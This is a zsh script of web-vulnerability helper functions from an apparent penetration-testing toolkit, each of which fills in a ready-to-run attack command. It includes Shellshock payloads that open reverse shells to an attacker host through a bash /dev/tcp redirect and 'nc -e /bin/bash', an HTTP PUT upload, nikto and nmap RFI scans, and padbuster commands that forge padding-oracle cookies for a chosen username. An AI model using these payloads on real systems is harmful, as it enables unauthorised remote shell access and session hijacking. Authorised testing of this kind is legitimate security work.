#!/usr/bin/env zsh

############################################################# 
# Web - Vuln
#############################################################

qq-enum-web-vuln-nikto() {
  local u && read "u?Url: "
  local d=$(echo "${u}" | cut -d/ -f3)
  print -z "nikto -C all -useragent \"${__UA}\" -h ${u} -output nikto.${d}.log"
}

qq-enum-web-vuln-nmap-rfi() {
  local r && read "r?Remote Host: "
  print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' -oN web.rfi.nmap ${r}"
}

qq-enum-web-vuln-shellshock-cookie() {
  local l && read "l?Local Host: "
  local port && read "port?Local Port: "
  print -z "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/${l}/${port} 0>&1"
}

qq-enum-web-vuln-shellshock-nc() {
  local l && read "l?Local Host: "
  local r && read "r?Remote Host: "
  local port && read "port?Local Port: "
  print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${l} ${port} -e /bin/bash\"' http://${r}/cgi-bin/status"
}

qq-enum-web-vuln-put-curl() {
  local r && read "r?Remote Host: "
  local f && read "f?File: "
  print -z "curl -T ${f} http://${r}/${f}"
}

qq-enum-web-vuln-padbuster-check() {
  local r && read "r?Remote Host: "
  local cn && read "cn?Cookie Name: "
  local cv && read "cv?Cookie Value: "
  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
}

qq-enum-web-vuln-padbuster-forge() {
  local r && read "r?Remote Host: "
  local cn && read "cn?Cookie Name: "
  local cv && read "cv?Cookie Value: "
  local u && read "u?Username: "
  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${u}"
}